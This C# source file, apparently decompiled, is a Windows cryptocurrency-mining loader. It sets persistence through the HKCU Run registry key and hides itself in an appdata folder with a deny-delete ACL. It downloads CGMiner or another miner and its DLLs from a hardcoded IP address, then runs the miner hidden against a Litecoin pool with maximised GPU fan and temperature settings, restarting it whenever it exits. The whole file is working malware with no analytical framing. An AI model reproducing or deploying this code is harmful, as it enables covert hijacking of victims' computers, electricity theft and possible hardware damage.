using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
public sealed class Form3
{
	private static Process MiningProcess = new Process();

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetModuleFileNameA(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int MoveFileExW([In][MarshalAs(UnmanagedType.LPTStr)] string lpExistingFileName, [In][MarshalAs(UnmanagedType.LPTStr)] string lpNewFileName, long dwFlags);

	[STAThread]
	public static void Main()
	{
		string name = "goblmah371z";
		try
		{
			Mutex.OpenExisting(name);
			Environment.Exit(0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			new Mutex(initiallyOwned: true, name);
			ProjectData.ClearProjectError();
		}
		if (!Directory.Exists(Interaction.Environ("appdata") + "\\1236"))
		{
			LockAndHideFolder(Interaction.Environ("appdata") + "\\1236");
		}
		((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("1236", Interaction.Environ("appdata") + "\\1236\\Loader.exe");
		if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\Loader.exe"))
		{
			string? fileName = Process.GetCurrentProcess().MainModule!.FileName;
			string lpFileName = Process.GetCurrentProcess().MainModule!.FileName;
			MoveFileExW(Strings.LSet(fileName, GetModuleFileNameA(0, ref lpFileName, 256)), Interaction.Environ("appdata") + "\\1236\\Loader.exe", 8L);
		}
		string path = Interaction.Environ("windir") + "\\System32\\OpenCL.DLL";
		new DirectoryInfo(path);
		if (File.Exists(path))
		{
			WebClient webClient = new WebClient();
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\CGmine.exe"))
			{
				webClient.DownloadFile("http://192.40.57.179/sov_9291/CGMiner.exe", Interaction.Environ("appdata") + "\\1236\\CGmine.exe");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\diablo130302.cl"))
			{
				webClient.DownloadFile("http://192.40.57.179/sov_9291/diablo130302.cl", Interaction.Environ("appdata") + "\\1236\\diablo130302.cl");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\diakgcn121016.cl"))
			{
				webClient.DownloadFile("http://192.40.57.179/sov_9291/diakgcn121016.cl", Interaction.Environ("appdata") + "\\1236\\diakgcn121016.cl");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\libeay32.dll"))
			{
				webClient.DownloadFile("http://192.40.57.179/sov_9291/libeay32.dll", Interaction.Environ("appdata") + "\\1236\\libeay32.dll");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\libidn-11.dll"))
			{
				webClient.DownloadFile("http://192.40.57.179/sov_9291/libidn-11.dll", Interaction.Environ("appdata") + "\\1236\\libidn-11.dll");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\phatk121016.cl"))
			{
				webClient.DownloadFile("http://192.40.57.179/sov_9291/phatk121016.cl", Interaction.Environ("appdata") + "\\1236\\phatk121016.cl");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\poclbm130302.cl"))
			{
				webClient.DownloadFile("http://192.40.57.179/sov_9291/poclbm130302.cl", Interaction.Environ("appdata") + "\\1236\\poclbm130302.cl");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\scrypt130511.cl"))
			{
				webClient.DownloadFile("http://192.40.57.179/sov_9291/scrypt130511.cl", Interaction.Environ("appdata") + "\\1236\\scrypt130511.cl");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\ssleay32.dll"))
			{
				webClient.DownloadFile("http://192.40.57.179/sov_9291/ssleay32.dll", Interaction.Environ("appdata") + "\\1236\\ssleay32.dll");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\zlib1.dll"))
			{
				webClient.DownloadFile("http://192.40.57.179/sov_9291/zlib1.dll", Interaction.Environ("appdata") + "\\1236\\zlib1.dll");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\libcurl-4.dll"))
			{
				webClient.DownloadFile("http://192.40.57.179/sov_9291/libcurl-4.dll", Interaction.Environ("appdata") + "\\1236\\libcurl-4.dll");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\librtmp.dll"))
			{
				webClient.DownloadFile("http://192.40.57.179/sov_9291/librtmp.dll", Interaction.Environ("appdata") + "\\1236\\librtmp.dll");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\libssh2.dll"))
			{
				webClient.DownloadFile("http://192.40.57.179/sov_9291/libssh2.dll", Interaction.Environ("appdata") + "\\1236\\libssh2.dll");
			}
			Thread.Sleep(3009);
			ProcessStartInfo startInfo = MiningProcess.StartInfo;
			startInfo.FileName = Interaction.Environ("appdata") + "\\1236\\CGmine.exe";
			startInfo.CreateNoWindow = true;
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			startInfo.Arguments = "--scrypt -o stratum+tcp://stratum2.wemineltc.com:3335 -u kaz7713.1 -p x --auto-fan --auto-gpu --gpu-threads 10 --gpu-fan 100 --temp-target 99 --temp-overheat 109 --no-submit-stale -I 10";
			startInfo = null;
		}
		else
		{
			WebClient webClient2 = new WebClient();
			WebClient webClient3 = new WebClient();
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\UFAMiner.exe"))
			{
				webClient3.DownloadFile("http://192.40.57.179/sov_9292/coin-miner.exe", Interaction.Environ("appdata") + "\\1236\\UFAMiner.exe");
			}
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\coinutil.dll"))
			{
				webClient2.DownloadFile("http://192.40.57.179/sov_9292/coinutil.dll", Interaction.Environ("appdata") + "\\1236\\coinutil.dll");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\miner.dl"))
			{
				webClient2.DownloadFile("http://192.40.57.179/sov_9292/miner.dll", Interaction.Environ("appdata") + "\\1236\\miner.dll");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\mpir.dll"))
			{
				webClient2.DownloadFile("http://192.40.57.179/sov_9292/mpir.dll", Interaction.Environ("appdata") + "\\1236\\mpir.dll");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\openssl.dll"))
			{
				webClient2.DownloadFile("http://192.40.57.179/sov_9292/openssl.dll", Interaction.Environ("appdata") + "\\1236\\openssl.dll");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\phatk.cl"))
			{
				webClient2.DownloadFile("http://192.40.57.179/sov_9292/phatk.cl", Interaction.Environ("appdata") + "\\1236\\phatk.cl");
			}
			Thread.Sleep(3010);
			if (!File.Exists(Interaction.Environ("appdata") + "\\1236\\usft_ext.dll"))
			{
				webClient2.DownloadFile("http://192.40.57.179/sov_9292/usft_ext.dll", Interaction.Environ("appdata") + "\\1236\\usft_ext.dll");
			}
			Thread.Sleep(3010);
			ProcessStartInfo startInfo2 = MiningProcess.StartInfo;
			startInfo2.FileName = Interaction.Environ("appdata") + "\\1236\\UFAMiner.exe";
			startInfo2.CreateNoWindow = true;
			startInfo2.WindowStyle = ProcessWindowStyle.Hidden;
			startInfo2.Arguments = "-a scrypt -g no -o stratum+tcp://stratum2.wemineltc.com:3335 -u kaz7713.1 -p x -t 0";
			startInfo2 = null;
		}
		MiningProcess.Start();
		MiningProcess.EnableRaisingEvents = true;
		MiningProcess.Exited += MiningProcessClosed;
		while (true)
		{
			Thread.Sleep(3010);
		}
	}

	public static void MiningProcessClosed(object sender, EventArgs e)
	{
		MiningProcess.Start();
	}

	public static bool LockAndHideFolder(string path)
	{
		string name = WindowsIdentity.GetCurrent().Name;
		FileSystemAccessRule rule = new FileSystemAccessRule("Administrators", FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
		FileSystemAccessRule rule2 = new FileSystemAccessRule(name, FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny);
		FileSystemAccessRule rule3 = new FileSystemAccessRule(name, FileSystemRights.Modify, InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
		DirectorySecurity directorySecurity = new DirectorySecurity();
		directorySecurity.AddAccessRule(rule);
		directorySecurity.AddAccessRule(rule3);
		directorySecurity.AddAccessRule(rule2);
		try
		{
			Process process = new Process();
			Directory.CreateDirectory(path, directorySecurity);
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "CMD.exe";
			processStartInfo.Arguments = "/C attrib -s -h " + Convert.ToString(path);
			process.StartInfo = processStartInfo;
			process.Start();
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
